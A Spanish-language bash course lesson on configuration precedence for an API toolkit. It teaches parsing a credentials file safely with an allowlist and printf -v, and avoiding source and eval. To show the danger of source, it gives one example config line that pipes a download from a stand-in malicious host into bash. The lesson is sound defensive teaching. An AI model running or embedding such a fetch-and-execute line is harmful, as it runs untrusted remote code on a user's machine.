# Configuración y precedencia

> Hasta la Semana 09, `~/.bc-curl` solo guardaba credenciales, y `BASE_URL`
> había que exportarla en cada terminal. Para usar el toolkit contra dos APIs
> hacía falta acordarse de qué estaba exportado. Esta teoría le da al toolkit
> una regla única para encontrar cada valor: el entorno, después el archivo,
> después el valor por defecto. Y explica por qué el archivo se lee línea a
> línea en vez de ejecutarlo con `source`.

![Tres capas apiladas para resolver cada variable. Arriba el entorno, que manda; en medio ~/.bc-curl, con permisos 600; abajo el valor por defecto del script. Una flecha baja por las capas hasta encontrar la primera que tiene valor. Al lado, el archivo se lee con un while y read, y solo se aceptan las claves de una lista; una línea con $(...) se queda como texto, mientras que source la ejecutaría](../0-assets/02-configuracion-y-precedencia.svg)

## 🎯 Objetivos

- Aplicar la precedencia entorno, archivo y valor por defecto
- Leer un archivo `CLAVE=valor` sin ejecutarlo
- Asignar y leer una variable cuyo nombre está en otra con `printf -v` y `${!nombre}`
- Limitar lo que el archivo puede cambiar con una lista de claves permitidas
- Saber dónde vive la configuración de una CLI y con qué permisos

---

## 1. Qué problema resuelve

Tres situaciones del día a día:

1. Trabajas siempre contra GitHub. Exportar `BASE_URL` en cada terminal
   nueva es un paso que se olvida, y el toolkit, sin avisar, habla con el
   laboratorio.
2. Un día quieres probar contra el laboratorio sin tocar tu configuración:
   `BASE_URL=http://localhost:8080 api-toolkit get /get`.
3. Una persona nueva instala el toolkit y no ha configurado nada: tiene que
   funcionar con valores razonables.

Las tres se resuelven con una sola regla, la misma que usan `git`, `ssh` o
`curl` con su `.curlrc`: **lo más cercano a la orden manda**.

---

## 2. Cómo funciona

### 2.1 Las tres capas

Para cada variable, el toolkit busca en este orden y se queda con el primer
valor no vacío:

| Capa | Ejemplo | Cuándo se usa |
|---|---|---|
| 1. Entorno | `BASE_URL=http://localhost:8080 api-toolkit ...` | Una vez, o en un script |
| 2. `BC_CURL_FILE` (por defecto `~/.bc-curl`) | `BASE_URL=https://api.github.com` | Siempre, en esa cuenta |
| 3. Valor por defecto | `http://localhost:8080` | Si nadie dijo nada |

Hasta la capa 9, `BASE_URL` recibía su valor por defecto en la primera línea
del script: `BASE_URL="${BASE_URL:-http://localhost:8080}"`. Con eso, el
archivo ya no podía darle valor, porque la variable nunca estaba vacía. La
capa 10 deja vacías arriba las que también pueden venir del archivo, y pone
los valores por defecto **después** de leerlo.

### 2.2 Por qué no `source`

Lo cómodo sería `source ~/.bc-curl`. Es un error de seguridad:

```bash
cat ~/.bc-curl
# BASE_URL=https://api.github.com
# API_KEY=$(curl -s https://malo.example/x | bash)
```

Con `source`, bash **ejecuta** cada línea: la segunda descarga y ejecuta un
programa. Y aunque nadie escriba algo así a propósito, una línea
`PATH=/opt/algo` cambiaría qué `curl` usa el toolkit. Un archivo de
configuración es **datos**. Se lee:

```bash
while IFS='=' read -r clave valor; do
  ...
done < <(grep -E '^[A-Z_]+=' "$BC_CURL_FILE" || true)
```

- `grep -E '^[A-Z_]+='` se queda con las líneas `CLAVE=...` y descarta
  comentarios y líneas en blanco. El `|| true` evita que un archivo sin
  ninguna línea válida pare el script con `set -e`.
- `IFS='=' read -r clave valor` parte por el primer `=`: lo que haya después,
  incluidos otros `=`, va entero a `valor`. `-r` deja las `\` como están.
- `$(...)` en `valor` es **texto**: nadie lo evalúa.

### 2.3 Una lista de claves permitidas

Leer no basta si después cualquier clave se convierte en variable. La capa 10
acepta solo las de una lista:

```bash
readonly CLAVES_ARCHIVO="BASE_URL AUTH_MODE API_CACERT OAUTH_TOKEN_URL ... API_TOKEN"

case " $CLAVES_ARCHIVO " in
  *" $clave "*) ... ;;     # está en la lista
  *) ;;                    # PATH, IFS, cualquier otra: se ignora
esac
```

Los espacios a los lados de `$CLAVES_ARCHIVO` y de `$clave` evitan que
`API_KEY` case dentro de `API_KEY_HEADER`.

### 2.4 Variables con nombre variable

Dentro del bucle, el nombre de la variable está en `$clave`. Bash tiene dos
herramientas para eso, sin `eval`:

| Quieres | Escribe | Ejemplo con `clave=BASE_URL` |
|---|---|---|
| Leer la variable cuyo nombre está en `clave` | `${!clave}` | El valor de `BASE_URL` |
| Asignarla | `printf -v "$clave" '%s' "$valor"` | `BASE_URL="$valor"` |

```bash
if [ -z "${!clave}" ]; then printf -v "$clave" '%s' "$valor"; fi
```

Se asigna solo si sigue vacía: si el entorno ya le dio valor, el archivo no
la pisa. Es toda la precedencia en una línea. `printf -v` existe desde bash
3.1: funciona también en el bash 3.2 de macOS.

### 2.5 Dónde vive y con qué permisos

`~/.bc-curl` guarda secretos desde la Semana 03, y la regla no cambia: **600
o el toolkit se niega a leerlo**. Que ahora también guarde `BASE_URL` no lo
relaja: el archivo entero se trata como secreto.

La convención moderna es `${XDG_CONFIG_HOME:-~/.config}/api-toolkit/config`.
El toolkit mantiene `~/.bc-curl` porque es donde lo dejaron nueve semanas de
material; `BC_CURL_FILE` permite moverlo.

---

## 3. Cómo se usa

```bash
cat ~/.bc-curl
# BASE_URL=http://localhost:8080/anything

api-toolkit --dry-run get /x | grep -o 'http://[^ ]*'
# http://localhost:8080/anything/x

BASE_URL=http://otra.invalid api-toolkit --dry-run get /x | grep -o 'http://[^ ]*'
# http://otra.invalid/x
```

El archivo da el valor de siempre; el entorno lo cambia para una orden.

Una línea con `$(...)` no hace nada. Pruébalo en un HOME de usar y tirar,
no en tu configuración real:

```bash
H="$(mktemp -d)"
( umask 077 && printf 'BASE_URL=http://ejemplo.invalid\nAPI_KEY=$(touch %s/ejecutado)\n' "$H" > "$H/.bc-curl" )
HOME="$H" api-toolkit --dry-run get /x > /dev/null
ls "$H/ejecutado"
# ls: cannot access '/tmp/tmp.XXXXXXXXXX/ejecutado': No such file or directory
rm -rf "$H"
```

---

## 4. Antipatrones

- **`source ~/.bc-curl`** o `eval "$(cat ~/.bc-curl)"`: ejecuta el archivo.
  Un archivo de configuración nunca es código.
- **Valores por defecto antes de leer el archivo.** `${BASE_URL:-...}` en la
  primera línea hace que el archivo no pueda cambiarla nunca.
- **El archivo manda sobre el entorno.** Impide probar algo puntual sin
  editarlo, y sorprende: todas las CLI conocidas hacen lo contrario.
- **Aceptar cualquier clave.** Un `PATH=` o un `IFS=` en el archivo cambiaría
  cómo se comporta el script entero.
- **`eval "$clave=\$valor"`**: funciona, y con una clave mal formada ejecuta
  lo que venga. `printf -v` asigna, y nada más.
- **Relajar los permisos porque "solo es la URL".** En cuanto el archivo
  tiene una línea de credencial, todo él es secreto.

---

## 5. Trucos

- **Ver de dónde sale un valor**: `api-toolkit --dry-run get /x` imprime la
  URL completa; si no es la que esperabas, mira el entorno con
  `env | grep BASE_URL` antes que el archivo.
- **Desactivar el archivo una vez**: `BC_CURL_FILE=/dev/null api-toolkit ...`.
  `/dev/null` no es un archivo normal, así que no se lee.
- **Probar con otro archivo** sin tocar el tuyo:
  `BC_CURL_FILE=./otra-api.conf api-toolkit get /x`. Tiene que tener 600.
- **Comprobar permisos de forma portable**: `ls -l ~/.bc-curl | cut -c1-10`
  imprime `-rw-------` en Linux y en macOS; `stat -c` solo existe en GNU.

---

## 📚 Recursos Adicionales

- [Bash Reference Manual — Shell Parameter Expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html)
- [BashFAQ/006 — How can I use variable variables?](https://mywiki.wooledge.org/BashFAQ/006)
- [XDG Base Directory Specification](https://specifications.freedesktop.org/basedir-spec/latest/)

---

## ✅ Checklist de Verificación

- [ ] Explicas el orden entorno, archivo y valor por defecto, y por qué ese
- [ ] Sabes por qué los valores por defecto van después de leer el archivo
- [ ] Explicas qué haría `source` con una línea `API_KEY=$(...)`
- [ ] Usas `${!clave}` y `printf -v` en lugar de `eval`
- [ ] Sabes por qué el archivo entero necesita permisos 600
